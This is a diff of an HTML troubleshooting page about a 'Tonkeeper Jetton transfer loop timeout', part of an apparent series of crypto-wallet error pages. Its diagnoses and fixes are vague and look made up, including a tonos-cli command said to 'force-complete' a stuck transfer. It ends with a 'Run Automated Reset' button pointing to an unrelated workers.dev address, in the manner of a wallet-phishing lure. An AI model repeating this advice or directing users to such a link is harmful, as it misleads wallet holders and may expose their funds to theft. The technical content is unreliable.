@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #1a1a24;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -42,35 +42,30 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message indicating a timeout during a Tonkeeper Jetton transfer, preventing the completion of the transaction. The error message explicitly states "Tonkeeper Jetton transfer loop timeout," and the transfer process appears to be stuck in an infinite loop.</li>
+<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a misconfiguration in the Tonkeeper settings or a temporary issue with the TON network, causing the transfer loop to exceed the maximum allowed time, resulting in a timeout.</li>
+<li>The error occurs due to a prolonged loop in the transfer process, often caused by network congestion, insufficient gas, or incorrect configuration of the smart contract.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Check the Tonkeeper configuration files for any syntax errors or incorrect settings.</li>
-<li>Use the following JSON configuration to override the default timeout settings:</li>
+<li>To resolve the issue, try the following:</li>
+<li>Increase the gas limit for the transaction</li>
+<li>Verify the smart contract configuration and ensure it is correctly deployed</li>
+<li>Use a custom script to bypass the loop and force-complete the transaction, such as:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;retry_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;contract_address&gt;<span class="w"> </span>transfer<span class="w"> </span><span class="s1">&#39;{&quot;dest&quot;:&quot;&lt;destination_address&gt;&quot;,&quot;amount&quot;:&lt;amount&gt;}&#39;</span><span class="w"> </span>--abi<span class="w"> </span>&lt;abi_file&gt;
 </code></pre></div>
 
-<ul>
-<li>Restart the Tonkeeper application to apply the changes.
-For more advanced troubleshooting, consider using an external console to execute low-level commands.</li>
-</ul>
+<p>Consider utilizing an external console for more complex debugging and transaction management.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonkeeper application installed and configured</li>
-<li>Basic understanding of TON network and Tonkeeper settings</li>
-<li>Access to the Tonkeeper configuration files</li>
+<li>Tonos-cli installed and configured</li>
+<li>ABI file for the smart contract</li>
+<li>Sufficient balance and gas for transactions</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
